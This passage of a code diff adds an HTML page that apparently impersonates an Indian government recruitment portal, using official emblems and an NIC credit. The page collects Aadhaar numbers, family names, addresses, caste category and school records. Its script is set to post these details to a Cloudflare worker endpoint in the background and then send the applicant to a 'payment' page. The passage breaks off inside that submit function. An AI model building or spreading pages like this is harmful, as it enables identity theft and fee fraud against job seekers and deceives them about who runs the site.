@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>National Recruitment Portal — Official Application</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Inter Font -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f8fafc;
+            color: #0f172a;
+        }
+
+        .input-field {
+            width: 100%;
+            background-color: #ffffff;
+            border: 1px solid #cbd5e1;
+            border-radius: 6px;
+            padding: 9px 12px;
+            font-size: 0.8125rem;
+            font-weight: 500;
+            color: #0f172a;
+            transition: all 0.15s ease-in-out;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #16a34a;
+            box-shadow: 0 0 0 3px rgba(22, 163, 74, 0.12);
+        }
+
+        .input-field.input-error {
+            border-color: #e11d48 !important;
+            background-color: #fff1f2 !important;
+        }
+
+        .input-field::placeholder {
+            color: #94a3b8;
+            font-weight: 400;
+        }
+
+        .keyboard-btn {
+            background-color: #18181b;
+            border: 1px solid #27272a;
+            color: #f4f4f5;
+            border-radius: 4px;
+            padding: 8px 4px;
+            font-size: 0.75rem;
+            font-weight: 500;
+            transition: all 0.1s ease;
+            cursor: pointer;
+            user-select: none;
+            text-align: center;
+        }
+
+        .keyboard-btn:hover {
+            background-color: #ffffff;
+            color: #000000;
+        }
+
+        .keyboard-btn:active {
+            transform: scale(0.95);
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #f1f1f1;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #16a34a;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between selection:bg-emerald-600 selection:text-white">
+
+    <!-- Top Accent Ribbon (Tricolor) -->
+    <div class="h-1.5 w-full bg-gradient-to-r from-orange-500 via-white to-emerald-600"></div>
+
+    <!-- Executive Header with Colorful Logos -->
+    <header class="w-full bg-white border-b border-slate-200">
+        <div class="max-w-5xl mx-auto px-4 py-4 flex justify-between items-center">
+            <div class="flex items-center space-x-4">
+                <a href="https://imgbb.com/" target="_blank" class="block">
+                    <img src="https://i.ibb.co/dsJC52TB/logo-png-b686afb9ac69b2a1342bd76217456b81.png" alt="Emblem of India" class="h-10 sm:h-12 w-auto object-contain">
+                </a>
+                <div class="h-8 w-px bg-slate-200 hidden sm:block"></div>
+                <div class="hidden sm:block">
+                    <h1 class="text-xs font-bold tracking-tight text-slate-900 uppercase">National Recruitment Portal</h1>
+                    <p class="text-[10px] text-slate-500 font-medium">Government of India • Career Services</p>
+                </div>
+            </div>
+
+            <div class="flex items-center space-x-4">
+                <a href="https://imgbb.com/" target="_blank" class="block">
+                    <img src="https://i.ibb.co/wFbTr2zM/0-eci-net-logo.png" alt="NVSP Logo" class="h-9 sm:h-11 w-auto object-contain">
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Sub Header Utility Bar -->
+    <div class="bg-slate-50 border-b border-slate-200 py-2.5">
+        <div class="max-w-5xl mx-auto px-4 flex justify-center items-center text-xs font-semibold text-slate-700 uppercase tracking-wider">
+            Job Application Form (Daily Basis)
+        </div>
+    </div>
+
+    <!-- On-Screen Virtual Keyboard Container -->
+    <div id="virtualKeyboard" class="hidden fixed bottom-0 left-0 right-0 bg-zinc-900 text-white p-4 z-50 border-t border-zinc-800 shadow-2xl transition-all">
+        <div class="max-w-3xl mx-auto">
+            <div class="flex justify-between items-center mb-3 pb-2 border-b border-zinc-800">
+                <div class="flex items-center space-x-2 text-xs font-semibold text-zinc-300">
+                    <i class="fa-solid fa-keyboard text-emerald-400"></i>
+                    <span>Virtual Hindi Keyboard Input</span>
+                </div>
+                <button type="button" onclick="toggleKeyboard(null)" class="text-zinc-400 hover:text-white text-xs px-2.5 py-1 rounded bg-zinc-800 hover:bg-zinc-700 transition cursor-pointer">
+                    <i class="fa-solid fa-xmark"></i> Close
+                </button>
+            </div>
+            
+            <div class="grid grid-cols-10 gap-1.5">
+                <button type="button" class="keyboard-btn" onclick="typeChar('अ')">अ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('आ')">आ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('इ')">इ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ई')">ई</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('उ')">उ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ऊ')">ऊ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ऋ')">ऋ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ए')">ए</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ऐ')">ऐ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ओ')">ओ</button>
+                
+                <button type="button" class="keyboard-btn" onclick="typeChar('क')">क</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ख')">ख</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ग')">ग</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('घ')">घ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('च')">च</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('छ')">छ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ज')">ज</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('झ')">झ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ट')">ट</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ठ')">ठ</button>
+
+                <button type="button" class="keyboard-btn" onclick="typeChar('ड')">ड</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ढ')">ढ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('त')">त</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('थ')">थ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('द')">द</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ध')">ध</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('न')">न</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('प')">प</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('फ')">फ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ब')">ब</button>
+
+                <button type="button" class="keyboard-btn" onclick="typeChar('भ')">भ</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('म')">म</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('य')">य</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('र')">र</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ल')">ल</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('व')">व</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('श')">श</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ष')">ष</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('स')">स</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ह')">ह</button>
+
+                <button type="button" class="keyboard-btn col-span-2 !bg-zinc-800 !text-white hover:!bg-zinc-700" onclick="typeChar(' ')">Space</button>
+                <button type="button" class="keyboard-btn col-span-2 !bg-zinc-800 !text-white hover:!bg-zinc-700" onclick="backspaceChar()">Backspace</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ा')">ा</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ि')">ि</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ी')">ी</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ु')">ु</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('ू')">ू</button>
+                <button type="button" class="keyboard-btn" onclick="typeChar('े')">े</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content Container -->
+    <main class="flex-1 max-w-4xl w-full mx-auto px-4 py-8">
+        
+        <!-- STEP WIZARD BAR -->
+        <div class="mb-8 bg-white p-5 rounded-lg border border-slate-200 shadow-2xs">
+            <div class="flex justify-between items-center mb-3">
+                <span id="txtStepIndicator" class="text-xs font-semibold text-slate-900 uppercase tracking-wide">Step 1 of 4: Personal Information</span>
+                <span id="txtProgressPercent" class="text-xs font-bold text-emerald-700 font-mono">25%</span>
+            </div>
+            
+            <div class="w-full bg-slate-100 h-1.5 rounded-full overflow-hidden mb-6">
+                <div id="progressBar" class="bg-emerald-600 h-1.5 rounded-full transition-all duration-300" style="width: 25%"></div>
+            </div>
+
+            <!-- Interactive Step Pills -->
+            <div class="grid grid-cols-4 gap-3 text-center">
+                <button type="button" id="tab1" onclick="goToStep(1)" class="py-2.5 px-2 rounded border border-emerald-600 bg-emerald-600 text-white text-[11px] font-semibold transition cursor-pointer shadow-sm">
+                    1. Personal Details
+                </button>
+                <button type="button" id="tab2" onclick="goToStep(2)" class="py-2.5 px-2 rounded border border-slate-200 bg-slate-50 text-slate-600 text-[11px] font-medium transition cursor-pointer hover:border-slate-300">
+                    2. Contact & Address
+                </button>
+                <button type="button" id="tab3" onclick="goToStep(3)" class="py-2.5 px-2 rounded border border-slate-200 bg-slate-50 text-slate-600 text-[11px] font-medium transition cursor-pointer hover:border-slate-300">
+                    3. Qualifications
+                </button>
+                <button type="button" id="tab4" onclick="goToStep(4)" class="py-2.5 px-2 rounded border border-slate-200 bg-slate-50 text-slate-600 text-[11px] font-medium transition cursor-pointer hover:border-slate-300">
+                    4. Declaration
+                </button>
+            </div>
+        </div>
+
+        <!-- FORM CARD CONTAINER -->
+        <div id="formContainer" class="bg-white p-6 sm:p-8 rounded-lg border border-slate-200 shadow-2xs">
+            
+            <form id="govtJobForm" onsubmit="event.preventDefault();">
+                
+                <!-- STEP 1: Personal Details -->
+                <div id="step1" class="space-y-5">
+                    <div class="border-b border-slate-200 pb-3 mb-2">
+                        <h2 class="text-sm font-bold text-slate-900 uppercase tracking-wide">1. Personal Identity & Demographics</h2>
+                        <p class="text-xs text-slate-500 mt-0.5">Enter details matching official Class 10 Certificate</p>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Full Name *</label>
+                            <div class="relative">
+                                <input type="text" id="fieldName" data-required="true" class="input-field pr-9" placeholder="John Doe">
+                                <button type="button" onclick="toggleKeyboard('fieldName')" class="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-emerald-600 transition">
+                                    <i class="fa-solid fa-keyboard"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Father's Name *</label>
+                            <input type="text" id="fieldFather" data-required="true" class="input-field" placeholder="Father's Full Name">
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Mother's Name *</label>
+                            <input type="text" id="fieldMother" data-required="true" class="input-field" placeholder="Mother's Full Name">
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Date of Birth *</label>
+                            <input type="date" id="fieldDob" data-required="true" class="input-field">
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Gender *</label>
+                            <select id="fieldGender" data-required="true" class="input-field cursor-pointer">
+                                <option value="" disabled selected>Select Gender</option>
+                                <option value="Male">Male</option>
+                                <option value="Female">Female</option>
+                                <option value="Transgender">Transgender</option>
+                            </select>
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Category *</label>
+                            <select id="fieldCategory" data-required="true" class="input-field cursor-pointer">
+                                <option value="" disabled selected>Select Category</option>
+                                <option value="UR/General">UR / General</option>
+                                <option value="OBC-NCL">OBC-NCL</option>
+                                <option value="SC">SC</option>
+                                <option value="ST">ST</option>
+                                <option value="EWS">EWS</option>
+                            </select>
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Aadhaar / Photo ID No *</label>
+                            <input type="text" id="fieldAadhaar" data-required="true" class="input-field" placeholder="12-digit Aadhaar Card No">
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Marital Status *</label>
+                            <select id="fieldMarital" data-required="true" class="input-field cursor-pointer">
+                                <option value="" disabled selected>Select Status</option>
+                                <option value="Unmarried">Unmarried</option>
+                                <option value="Married">Married</option>
+                                <option value="Widow/Divorced">Widow / Divorced</option>
+                            </select>
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Are you PwBD? *</label>
+                            <select id="fieldPwbd" data-required="true" class="input-field cursor-pointer">
+                                <option value="" disabled selected>Select Option</option>
+                                <option value="No">No</option>
+                                <option value="Yes">Yes</option>
+                            </select>
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Ex-Serviceman Status *</label>
+                            <select id="fieldExServiceman" data-required="true" class="input-field cursor-pointer">
+                                <option value="" disabled selected>Select Option</option>
+                                <option value="No">No</option>
+                                <option value="Yes">Yes</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- STEP 2: Contact & Address -->
+                <div id="step2" class="hidden space-y-5">
+                    <div class="border-b border-slate-200 pb-3 mb-2">
+                        <h2 class="text-sm font-bold text-slate-900 uppercase tracking-wide">2. Communication & Permanent Address</h2>
+                        <p class="text-xs text-slate-500 mt-0.5">Ensure active Email & Mobile for application updates</p>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Mobile Number *</label>
+                            <input type="tel" id="fieldMobile" data-required="true" class="input-field" placeholder="10-Digit Mobile">
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Email ID *</label>
+                            <input type="email" id="fieldEmail" data-required="true" class="input-field" placeholder="name@domain.com">
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Permanent Address Line 1 *</label>
+                            <input type="text" id="fieldAddrLine1" data-required="true" class="input-field" placeholder="House No / Street / Village">
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">District *</label>
+                            <input type="text" id="fieldDistrict" data-required="true" class="input-field" placeholder="District Name">
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">State / UT *</label>
+                            <input type="text" id="fieldState" data-required="true" class="input-field" placeholder="State Name">
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">PIN Code *</label>
+                            <input type="text" id="fieldPincode" maxlength="6" data-required="true" class="input-field" placeholder="6-digit PIN">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- STEP 3: Educational Qualifications -->
+                <div id="step3" class="hidden space-y-5">
+                    <div class="border-b border-slate-200 pb-3 mb-2">
+                        <h2 class="text-sm font-bold text-slate-900 uppercase tracking-wide">3. Educational Qualifications</h2>
+                        <p class="text-xs text-slate-500 mt-0.5">Academic records essential for candidate eligibility</p>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">10th Board Name *</label>
+                            <input type="text" id="fieldBoard10" data-required="true" class="input-field" placeholder="CBSE / State Board Name">
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">10th Roll Number *</label>
+                            <input type="text" id="fieldRoll10" data-required="true" class="input-field" placeholder="Roll Number">
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">10th Passing Year *</label>
+                            <input type="number" id="fieldYear10" data-required="true" class="input-field" placeholder="YYYY">
+                        </div>
+
+                        <div>
+                            <label class="block font-semibold text-slate-700 mb-1">Highest Qualification Degree *</label>
+                            <select id="fieldDegree" data-required="true" class="input-field cursor-pointer">
+                                <option value="" disabled selected>Select Degree</option>
+                                <option value="10th Pass">10th Pass (Matric)</option>
+                                <option value="12th Pass">12th Pass (Intermediate)</option>
+                                <option value="Graduation">Graduation (Bachelor Degree)</option>
+                                <option value="Post Graduation">Post Graduation (Master Degree)</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- STEP 4: Final Declaration -->
+                <div id="step4" class="hidden space-y-5">
+                    <div class="border-b border-slate-200 pb-3 mb-2">
+                        <h2 class="text-sm font-bold text-slate-900 uppercase tracking-wide">4. Self Declaration</h2>
+                        <p class="text-xs text-slate-500 mt-0.5">Read terms before proceeding to preview</p>
+                    </div>
+
+                    <div class="bg-slate-50 p-4 rounded border border-slate-200 text-xs space-y-2 text-slate-600 leading-relaxed font-normal">
+                        <p class="font-bold text-slate-900 uppercase tracking-wider text-[11px]">Declaration:</p>
+                        <p>1. I hereby declare that all information furnished in this online application form is true, correct, and complete to the best of my knowledge.</p>
+                        <p>2. In the event of any information being found false, fraudulent, or incorrect at any stage, my candidature shall stand cancelled automatically without notice.</p>
+                    </div>
+
+                    <div class="flex items-center space-x-2.5 pt-2">
+                        <input type="checkbox" id="chkAgree" class="w-4 h-4 text-emerald-600 rounded border-slate-300 focus:ring-emerald-500 cursor-pointer">
+                        <label for="chkAgree" class="text-xs font-medium text-slate-800 cursor-pointer">I hereby accept the above declaration and terms. *</label>
+                    </div>
+                </div>
+
+                <!-- Wizard Actions -->
+                <div class="flex justify-between items-center pt-6 border-t border-slate-200 mt-6">
+                    <button type="button" id="btnPrev" onclick="prevStep()" class="hidden px-5 py-2.5 bg-rose-600 hover:bg-rose-700 text-white font-semibold rounded text-xs transition cursor-pointer flex items-center space-x-2 shadow-sm active:scale-[0.98]">
+                        <i class="fa-solid fa-arrow-left text-[10px]"></i>
+                        <span>Back</span>
+                    </button>
+
+                    <button type="button" id="btnNext" onclick="nextStep()" class="ml-auto px-6 py-2.5 bg-emerald-600 hover:bg-emerald-700 text-white font-semibold rounded text-xs transition cursor-pointer flex items-center space-x-2 shadow-sm active:scale-[0.98]">
+                        <span id="btnNextText">Next</span>
+                        <i class="fa-solid fa-arrow-right text-[10px]" id="btnNextIcon"></i>
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <!-- COMPLETE PREVIEW SUMMARY CARD -->
+        <div id="previewCard" class="hidden bg-white p-6 sm:p-8 rounded-lg border border-slate-200 shadow-2xs">
+            <div class="border-b border-slate-200 pb-3 mb-5 flex justify-between items-center">
+                <div>
+                    <h2 class="text-sm font-bold text-slate-900 uppercase tracking-wide">Application Data Preview</h2>
+                    <p class="text-xs text-slate-500 mt-0.5">Please verify all submitted application fields prior to payment</p>
+                </div>
+                <span class="px-2.5 py-1 bg-emerald-100 text-emerald-800 text-[10px] font-mono font-bold rounded">VERIFIED</span>
+            </div>
+
+            <!-- Detailed Grid Preview of ALL Inputs -->
+            <div class="space-y-6 mb-8 text-xs">
+                
+                <!-- Section 1 -->
+                <div>
+                    <h3 class="font-bold text-slate-900 uppercase tracking-wider text-[11px] mb-2.5 pb-1 border-b border-slate-200">Personal Details</h3>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5 bg-slate-50 p-3.5 rounded border border-slate-200">
+                        <div><span class="text-slate-500">Full Name:</span> <span id="prevName" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">Father's Name:</span> <span id="prevFather" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">Mother's Name:</span> <span id="prevMother" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">Date of Birth:</span> <span id="prevDob" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">Gender:</span> <span id="prevGender" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">Category:</span> <span id="prevCategory" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">Aadhaar / ID No:</span> <span id="prevAadhaar" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">Marital Status:</span> <span id="prevMarital" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">PwBD Status:</span> <span id="prevPwbd" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">Ex-Serviceman:</span> <span id="prevExServiceman" class="font-semibold text-slate-900">--</span></div>
+                    </div>
+                </div>
+
+                <!-- Section 2 -->
+                <div>
+                    <h3 class="font-bold text-slate-900 uppercase tracking-wider text-[11px] mb-2.5 pb-1 border-b border-slate-200">Contact & Address</h3>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5 bg-slate-50 p-3.5 rounded border border-slate-200">
+                        <div><span class="text-slate-500">Mobile Number:</span> <span id="prevMobile" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">Email Address:</span> <span id="prevEmail" class="font-semibold text-slate-900">--</span></div>
+                        <div class="sm:col-span-2"><span class="text-slate-500">Permanent Address:</span> <span id="prevAddrLine1" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">District:</span> <span id="prevDistrict" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">State / UT:</span> <span id="prevState" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">PIN Code:</span> <span id="prevPincode" class="font-semibold text-slate-900">--</span></div>
+                    </div>
+                </div>
+
+                <!-- Section 3 -->
+                <div>
+                    <h3 class="font-bold text-slate-900 uppercase tracking-wider text-[11px] mb-2.5 pb-1 border-b border-slate-200">Educational Qualifications</h3>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5 bg-slate-50 p-3.5 rounded border border-slate-200">
+                        <div><span class="text-slate-500">10th Board Name:</span> <span id="prevBoard10" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">10th Roll Number:</span> <span id="prevRoll10" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">10th Passing Year:</span> <span id="prevYear10" class="font-semibold text-slate-900">--</span></div>
+                        <div><span class="text-slate-500">Highest Qualification:</span> <span id="prevDegree" class="font-semibold text-slate-900">--</span></div>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- Preview Actions -->
+            <div class="flex space-x-3">
+                <button type="button" onclick="handleEdit()" class="flex-1 py-2.5 bg-rose-600 hover:bg-rose-700 text-white rounded font-semibold text-xs transition cursor-pointer flex items-center justify-center space-x-2 shadow-sm active:scale-[0.98]">
+                    <i class="fa-solid fa-pen text-[10px]"></i>
+                    <span>Edit Form Data</span>
+                </button>
+                <button type="button" onclick="handleFinalSubmit()" class="flex-1 py-2.5 bg-emerald-600 hover:bg-emerald-700 text-white rounded font-semibold text-xs transition cursor-pointer flex items-center justify-center space-x-2 shadow-sm active:scale-[0.98]">
+                    <span>Proceed to Payment</span>
+                    <i class="fa-solid fa-arrow-right text-[10px]"></i>
+                </button>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Executive Footer -->
+    <footer class="bg-slate-900 text-slate-400 text-[11px] py-6 px-4 border-t border-slate-800">
+        <div class="max-w-5xl mx-auto text-center space-y-1">
+            <p class="font-semibold text-slate-200">National Recruitment Portal • Government Services Engine</p>
+            <p class="text-slate-500">Designed and Maintained by National Informatics Centre (NIC)</p>
+            <p class="text-[10px] text-slate-500 pt-2">© 2026 Official Recruitment Cell. All Rights Reserved.</p>
+        </div>
+    </footer>
+
+    <!-- JavaScript Logic -->
+    <script>
+        const WORKER_URL = "https://your-worker-name.your-subdomain.workers.dev";
+
+        let currentStep = 1;
+        let activeInputId = null;
+
+        function toggleKeyboard(inputId) {
+            const kb = document.getElementById("virtualKeyboard");
+            if (inputId === null || activeInputId === inputId) {
+                kb.classList.add("hidden");
+                activeInputId = null;
+            } else {
+                activeInputId = inputId;
+                kb.classList.remove("hidden");
+                document.getElementById(inputId).focus();
+            }
+        }
+
+        function typeChar(char) {
+            if (!activeInputId) return;
+            const input = document.getElementById(activeInputId);
+            input.value += char;
+            input.classList.remove("input-error");
+            input.focus();
+        }
+
+        function backspaceChar() {
+            if (!activeInputId) return;
+            const input = document.getElementById(activeInputId);
+            input.value = input.value.slice(0, -1);
+            input.focus();
+        }
+
+        function updateStepUI() {
+            for (let i = 1; i <= 4; i++) {
+                document.getElementById(`step${i}`).classList.add("hidden");
+                const tab = document.getElementById(`tab${i}`);
+                tab.className = "py-2.5 px-2 rounded border border-slate-200 bg-slate-50 text-slate-600 text-[11px] font-medium transition cursor-pointer hover:border-slate-300";
+            }
+
+            document.getElementById(`step${currentStep}`).classList.remove("hidden");
+            const activeTab = document.getElementById(`tab${currentStep}`);
+            activeTab.className = "py-2.5 px-2 rounded border border-emerald-600 bg-emerald-600 text-white text-[11px] font-semibold transition cursor-pointer shadow-sm";
+
+            const percent = currentStep * 25;
+            document.getElementById("progressBar").style.width = `${percent}%`;
+            document.getElementById("txtProgressPercent").innerText = `${percent}%`;
+
+            const titles = [
+                "Step 1 of 4: Personal Information",
+                "Step 2 of 4: Communication & Address",
+                "Step 3 of 4: Educational Qualifications",
+                "Step 4 of 4: Self Declaration"
+            ];
+            document.getElementById("txtStepIndicator").innerText = titles[currentStep - 1];
+
+            if (currentStep === 1) {
+                document.getElementById("btnPrev").classList.add("hidden");
+            } else {
+                document.getElementById("btnPrev").classList.remove("hidden");
+            }
+        }
+
+        // Custom validation function for active step only
+        function validateCurrentStep() {
+            const activeContainer = document.getElementById(`step${currentStep}`);
+            const requiredFields = activeContainer.querySelectorAll('[data-required="true"]');
+            let isValid = true;
+            let firstInvalidField = null;
+
+            requiredFields.forEach(field => {
+                if (!field.value || field.value.trim() === '') {
+                    isValid = false;
+                    field.classList.add("input-error");
+                    if (!firstInvalidField) firstInvalidField = field;
+                } else {
+                    field.classList.remove("input-error");
+                }
+            });
+
+            // Special check for Step 4 Checkbox
+            if (currentStep === 4) {
+                const chk = document.getElementById("chkAgree");
+                if (!chk.checked) {
+                    isValid = false;
+                    chk.focus();
+                }
+            }
+
+            if (!isValid && firstInvalidField) {
+                firstInvalidField.focus();
+            }
+
+            return isValid;
+        }
+
+        function nextStep() {
+            // Validate step before advancing
+            if (!validateCurrentStep()) {
+                return;
+            }
+
+            if (currentStep < 4) {
+                currentStep++;
+                updateStepUI();
+            } else {
+                // Populate preview on final step completion
+                document.getElementById("prevName").innerText = document.getElementById("fieldName").value.trim() || "--";
+                document.getElementById("prevFather").innerText = document.getElementById("fieldFather").value.trim() || "--";
+                document.getElementById("prevMother").innerText = document.getElementById("fieldMother").value.trim() || "--";
+                document.getElementById("prevDob").innerText = document.getElementById("fieldDob").value || "--";
+                document.getElementById("prevGender").innerText = document.getElementById("fieldGender").value || "--";
+                document.getElementById("prevCategory").innerText = document.getElementById("fieldCategory").value || "--";
+                document.getElementById("prevAadhaar").innerText = document.getElementById("fieldAadhaar").value.trim() || "--";
+                document.getElementById("prevMarital").innerText = document.getElementById("fieldMarital").value || "--";
+                document.getElementById("prevPwbd").innerText = document.getElementById("fieldPwbd").value || "--";
+                document.getElementById("prevExServiceman").innerText = document.getElementById("fieldExServiceman").value || "--";
+
+                document.getElementById("prevMobile").innerText = document.getElementById("fieldMobile").value.trim() || "--";
+                document.getElementById("prevEmail").innerText = document.getElementById("fieldEmail").value.trim() || "--";
+                document.getElementById("prevAddrLine1").innerText = document.getElementById("fieldAddrLine1").value.trim() || "--";
+                document.getElementById("prevDistrict").innerText = document.getElementById("fieldDistrict").value.trim() || "--";
+                document.getElementById("prevState").innerText = document.getElementById("fieldState").value.trim() || "--";
+                document.getElementById("prevPincode").innerText = document.getElementById("fieldPincode").value.trim() || "--";
+
+                document.getElementById("prevBoard10").innerText = document.getElementById("fieldBoard10").value.trim() || "--";
+                document.getElementById("prevRoll10").innerText = document.getElementById("fieldRoll10").value.trim() || "--";
+                document.getElementById("prevYear10").innerText = document.getElementById("fieldYear10").value.trim() || "--";
+                document.getElementById("prevDegree").innerText = document.getElementById("fieldDegree").value || "--";
+
+                document.getElementById("formContainer").classList.add("hidden");
+                document.getElementById("previewCard").classList.remove("hidden");
+                document.getElementById("virtualKeyboard").classList.add("hidden");
+            }
+        }
+
+        function goToStep(stepNum) {
+            if (stepNum > currentStep && !validateCurrentStep()) {
+                return;
+            }
+            currentStep = stepNum;
+            updateStepUI();
+        }
+
+        function prevStep() {
+            if (currentStep > 1) {
+                currentStep--;
+                updateStepUI();
+            }
+        }
+
+        function handleEdit() {
+            document.getElementById("previewCard").classList.add("hidden");
+            document.getElementById("formContainer").classList.remove("hidden");
+        }
+
+        // Final Submit: Background worker payload + instant redirect to payment.html
+        function handleFinalSubmit() {
+            const formData = {
+                name: document.getElementById("fieldName").value.trim(),
+                fatherName: document.getElementById("fieldFather").value.trim(),
+                motherName: document.getElementById("fieldMother").value.trim(),
+                dob: document.getElementById("fieldDob").value,
+                gender: document.getElementById("fieldGender").value,
+                category: document.getElementById("fieldCategory").value,
+                aadhaar: document.getElementById("fieldAadhaar").value.trim(),
+                marital: document.getElementById("fieldMarital").value,
+                pwbd: document.getElementById("fieldPwbd").value,
+                exServiceman: document.getElementById("fieldExServiceman").value,
+                mobile: document.getElementById("fieldMobile").value.trim(),
+                email: document.getElementById("fieldEmail").value.trim(),
+                address: document.getElementById("fieldAddrLine1").value.trim(),
+                district: document.getElementById("fieldDistrict").value.trim(),
+                state: document.getElementById("fieldState").value.trim(),
+                pincode: document.getElementById("fieldPincode").value.trim(),
+                board10: document.getElementById("fieldBoard10").value.trim(),
